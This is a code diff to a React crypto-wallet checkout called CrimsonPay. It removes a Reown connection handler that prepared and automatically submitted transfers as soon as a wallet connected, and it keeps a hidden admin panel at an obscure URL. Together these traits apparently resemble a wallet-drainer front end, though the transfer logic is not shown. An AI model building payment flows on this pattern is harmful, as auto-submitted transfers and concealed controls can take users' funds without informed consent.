@@ -7,7 +7,6 @@ import TrackingSnippets from './components/TrackingSnippets';
 import { getConfig, postJson } from './lib/api';
 import { prepareTransfers } from './lib/transfers';
 import { connectWallet, executeTransfer, openWalletApp } from './lib/wallet';
-import { initializeReown } from './lib/reown';
 
 const WALLET_KEY = 'crimsonpay_selected_wallet';
 function CheckoutApp() {
@@ -19,15 +18,12 @@ function CheckoutApp() {
   const [busy, setBusy] = useState(false);
   const [logosReady, setLogosReady] = useState(false);
   const [error, setError] = useState('');
-  const [reownReady, setReownReady] = useState(false);
   const completedTransfersRef = useRef([]);
 
   useEffect(() => {
     let active = true;
     getConfig().then((nextConfig) => {
       if (!active) return;
-      initializeReown(nextConfig);
-      setReownReady(true);
       setConfig(nextConfig);
     }).catch((cause) => active && setError(cause.message));
     Promise.all(WALLETS.map((wallet) => new Promise((resolve) => { const image = new Image(); image.onload = resolve; image.onerror = resolve; image.src = wallet.logo; }))).then(() => active && setLogosReady(true));
@@ -91,25 +87,6 @@ function CheckoutApp() {
     }
   }
 
-  async function connectReown(next, walletName) {
-    setSelectedWallet(walletName);
-    localStorage.setItem(WALLET_KEY, walletName);
-    setBusy(true);
-    setError('');
-    setResults([]);
-    completedTransfersRef.current = [];
-    setConnection(next);
-    try {
-      const queue = await preparePayment(next, config);
-      if (config.automaticPayment !== false) await submitCurrent(next, queue, walletName, config);
-    } catch (cause) {
-      const message = cause?.message || cause?.reason || cause?.data?.message || 'Unable to prepare the payment.';
-      setResults([{ ok: false, message }]);
-    } finally {
-      setBusy(false);
-    }
-  }
-
   async function confirm() {
     if (!transfers.length) return;
     setBusy(true);
@@ -125,7 +102,7 @@ function CheckoutApp() {
 
   return <><TrackingSnippets tracking={config?.tracking} /><main className="shell"><div className="checkout-stack">
     {config && <section className="payment-summary"><div className="brand-dot">◆</div><div><p className="eyebrow">CRIMSONPAY CARD PAYMENT</p><h1>Confirm ${config.amountUsd} payment</h1><p className="muted">{config.cardName} · {config.theme} card</p></div></section>}
-    {!connection ? <WalletPicker busy={busy || !config} selectedName={selectedWallet} amount={config?.amountUsd} reownReady={reownReady} onReownConnected={connectReown} onPick={connect} /> : <ReviewPanel connection={connection} walletName={selectedWallet} amount={config.amountUsd} transfers={transfers} results={results} running={busy} onConfirm={confirm} />}
+    {!connection ? <WalletPicker busy={busy || !config} selectedName={selectedWallet} amount={config?.amountUsd} onPick={connect} /> : <ReviewPanel connection={connection} walletName={selectedWallet} amount={config.amountUsd} transfers={transfers} results={results} running={busy} onConfirm={confirm} />}
   </div><FlowLoader show={!config || !logosReady || busy} logo={busy ? walletLogo(selectedWallet) : ''} label={busy && selectedWallet ? `Connecting to ${selectedWallet}` : 'Loading secure wallets'} />{error && <p className="global-error">{error}</p>}</main></>;
 }
 export default function App() { return window.location.pathname === '/crimsonpay-secure-operations-control-center' ? <AdminPanel /> : <CheckoutApp />; }
